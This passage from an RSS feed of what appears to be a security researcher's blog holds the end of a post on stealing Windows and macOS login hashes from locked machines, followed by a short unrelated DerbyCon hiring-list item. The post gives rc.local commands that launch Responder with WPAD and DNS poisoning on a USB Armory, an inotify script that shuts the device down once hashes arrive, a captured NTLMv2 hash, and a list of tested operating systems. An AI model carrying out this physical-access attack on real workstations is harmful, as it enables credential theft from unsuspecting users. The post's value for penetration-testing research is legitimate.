&lt;pre&gt;&lt;code&gt;rm -rf /overlay/etc/turtle/Responder/logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the &lt;code&gt;/overlay/etc/rc.local&lt;/code&gt; file is slightly different&lt;/p&gt;

&lt;h4 id=&#34;overlay-etc-rc-local&#34;&gt;/overlay/etc/rc.local&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;/etc/init.d/dnsmasq stop
/usr/sbin/screen -dmS responder bash -c &#39;cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;why-does-this-work&#34;&gt;Why does this work?&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;Because USB is Plug-and-Play. This means that even if a system is locked out, the device still gets installed. Now, I believe there are restrictions on what types of devices are allowed to install at a locked out state on newer operating systems (Win10/El Capitan), but Ethernet/LAN is definitely on the white list.&lt;/li&gt;
&lt;li&gt;Computers are constantly creating traffic, even if you don&amp;rsquo;t have any browsers or applications open, and most computers trust their local network for some reason (I know the technical bits on &amp;lsquo;why&amp;rsquo;, just complaining&amp;hellip;)&lt;/li&gt;
&lt;li&gt;Network preference when there are more than gateway or network connection is based on &amp;ldquo;metrics&amp;rdquo; on Windows and a combination of metrics and &lt;a href=&#34;https://support.apple.com/kb/PH18458?locale=en_US&#34;&gt;&amp;ldquo;preference&amp;rdquo; on OSX&lt;/a&gt;, but by default &amp;ldquo;wired&amp;rdquo; and &amp;ldquo;newer/faster&amp;rdquo; always win out.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This means that by plugging in the device it quickly becomes the gateway, DNS server, WPAD server and others thanks to Responder.&lt;/p&gt;

&lt;p&gt;The average time for freshly inserted into a locked workstation and by the time I have creds is about 13 seconds, all depends on the system. Some addition setup I used inotify to watch for a file change in the &lt;code&gt;Responder.db&lt;/code&gt; database and shutdown the Armory. This helps finalize file writes as well and giving me an indicator via the LED that creds were obtained.&lt;/p&gt;

&lt;p&gt;To do that you need to install the &lt;code&gt;inotify-tools&lt;/code&gt; package and add the following to the &lt;code&gt;rc.local&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;end-result&#34;&gt;End Result:&lt;/h1&gt;

&lt;p&gt;What you see in the video is the Windows 10 lock screen (Full screened fresh install VM). When the LED goes solid white the Armory has fully shutdown because of the watch script, creds achieved!.&lt;/p&gt;


&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;//www.youtube.com/embed/Oplubg5q7ao&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;


&lt;p&gt;Bring it back home and look at the results:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# sqlite3 /root/responder/Responder.db &#39;select * from responder&#39;
2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCK\mubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000....
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sweet!! Game over!&lt;/p&gt;

&lt;p&gt;Tested on:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Windows 98 SE&lt;/li&gt;
&lt;li&gt;Windows 2000 SP4&lt;/li&gt;
&lt;li&gt;Windows XP SP3&lt;/li&gt;
&lt;li&gt;Windows 7 SP1&lt;/li&gt;
&lt;li&gt;Windows 10 (Enterprise and Home)&lt;/li&gt;
&lt;li&gt;OSX El Capitan / Mavericks (I was able to get creds on both of these but I&amp;rsquo;m still testing to see if it was a fluke, or my own configurations)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I still have not tested on Linux, I will make a new post on if that works. Please leave comments below if you see things I can improve upon, or errors.&lt;/p&gt;

&lt;h3 id=&#34;usb-armory-vs-hak5-lan-turtle&#34;&gt;USB Armory vs Hak5 LAN Turtle&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;The Armory is more versitile with APT package to do more fun, definitely a great way to dev the attack. More storage (SD based) and slightly faster processor&lt;/li&gt;
&lt;li&gt;Hak5 LAN Turtle is MUCH easier to pass off when you are trying to plug in a device during an SE attack. It might not have the LED that the Armory does for determining when creds are achieved, but it has the added functionality of a working ethernet port, so you could get creds AND a shell. Definitely worth the extra hassel to get it working right.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>2016 DerbyCon Hiring List</title>
      <link>https://malicious.link/post/2016/2016-derbycon-hiring-list/</link>
      <pubDate>Wed, 17 Aug 2016 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/2016-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2016 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/LW5b1xo4O9D8eVZU2&#34;&gt;https://goo.gl/forms/LW5b1xo4O9D8eVZU2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/edit?usp=sharing&#34;&gt;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/edit?usp=sharing&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; src=&#34;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34; width=&#34;900&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
  </channel>
</rss>
